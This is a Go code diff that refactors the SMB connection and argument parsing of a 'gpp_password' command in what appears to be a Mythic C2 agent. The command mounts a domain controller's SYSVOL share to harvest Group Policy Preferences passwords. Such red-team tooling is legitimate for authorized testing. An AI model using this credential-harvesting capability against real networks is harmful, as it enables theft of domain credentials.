@@ -8,7 +8,6 @@ import (
 	"encoding/xml"
 	"fmt"
 	"io"
-	"net"
 	"strings"
 	"time"
 
@@ -60,7 +59,7 @@ func (c *GppPasswordCommand) Execute(task structs.Task) structs.CommandResult {
 	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
 		return errorf("Error parsing parameters: %v", err)
 	}
-	defer structs.ZeroString(&args.Password)
+	defer zeroCredentials(&args.Password)
 
 	if args.Server == "" {
 		return errorResult("Error: server (domain controller) is required")
@@ -75,13 +74,7 @@ func (c *GppPasswordCommand) Execute(task structs.Task) structs.CommandResult {
 
 	// Parse domain from username
 	if args.Domain == "" {
-		if parts := strings.SplitN(args.Username, "@", 2); len(parts) == 2 {
-			args.Domain = parts[1]
-			args.Username = parts[0]
-		} else if parts := strings.SplitN(args.Username, `\`, 2); len(parts) == 2 {
-			args.Domain = parts[0]
-			args.Username = parts[1]
-		}
+		args.Domain, args.Username = parseDomainUser(args.Username)
 	}
 
 	output, creds, err := searchGPPPasswords(args)
@@ -140,24 +133,14 @@ type gppDrives struct {
 
 func searchGPPPasswords(args gppArgs) (string, []structs.MythicCredential, error) {
 	// Connect to DC via SMB
-	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", args.Server, args.Port), 10*time.Second)
+	session, conn, err := smbDialSession(args.Server, args.Port, args.Username, args.Domain, args.Password, "", 10*time.Second)
 	if err != nil {
-		return "", nil, fmt.Errorf("TCP connect to %s:%d: %v", args.Server, args.Port, err)
+		return "", nil, fmt.Errorf("SMB connect: %v", err)
 	}
-
-	initiator := &smb2.NTLMInitiator{
-		User:     args.Username,
-		Password: args.Password,
-		Domain:   args.Domain,
-	}
-
-	d := &smb2.Dialer{Initiator: initiator}
-	session, err := d.Dial(conn)
-	if err != nil {
+	defer func() {
+		_ = session.Logoff()
 		_ = conn.Close()
-		return "", nil, fmt.Errorf("SMB auth failed: %v", err)
-	}
-	defer func() { _ = session.Logoff() }()
+	}()
 
 	// Mount SYSVOL share
 	share, err := session.Mount(fmt.Sprintf(`\\%s\SYSVOL`, args.Server))
